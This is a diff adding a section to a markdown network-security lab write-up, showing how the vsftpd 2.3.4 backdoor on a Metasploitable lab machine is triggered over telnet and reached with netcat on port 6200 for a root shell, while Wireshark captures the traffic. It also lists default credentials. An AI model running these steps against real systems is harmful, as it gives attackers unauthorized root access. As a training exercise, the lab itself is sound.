@@ -140,3 +140,62 @@ tcp.flags.syn == 1 and tcp.flags.ack == 0 and ip.src == 10.0.2.5
 
 ![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation10.png)
 
+## STEP 1.1.3.4: Capturing Real Exploit (FTP Backdoor)
+
+Metasploitable has a backdoor in FTP.  exploit it and capture everything.
+
+1. **Start capture in Wireshark**
+
+2. Connect to the FTP backdoor from Kali:
+Metasploitable vsftpd has a backdoor on port 21 
+
+```bash
+telnet 10.0.2.4 21
+```
+
+Default Metasploitable user
+
+- **USER** ***msfadmin***
+
+Default password
+
+**PASS** ***msfadmin***
+
+![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation12.png)
+
+
+3. Connect to the backdoor shell (in a NEW Kali terminal):
+
+
+You will see the FTP banner:
+
+-- 220 (vsFTPd 2.3.4)  --
+
+- **Type:**
+
+USER ***test:)***
+
+- Press Enter, then:
+
+PASS cualquiercosa
+
+![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation12.png)
+
+4. Connect to the backdoor shell (in a NEW Kali terminal):
+
+```bash
+nc 10.0.2.4 6200
+```
+
+***You should get a shell:***
+- id
+   - uid=0(root) gid=0(root)
+
+- whoami
+   - root
+
+- ls
+   - bin  boot  cdrom  dev  etc  home ...
+
+![Lab1.1.3-NetworkTraffic](/assets/screenshots/network-security/wireshark/1.1.3-NetworkTraffic-Documentation/1.1.3-NetworkTraffic-Documentation11.png)
+
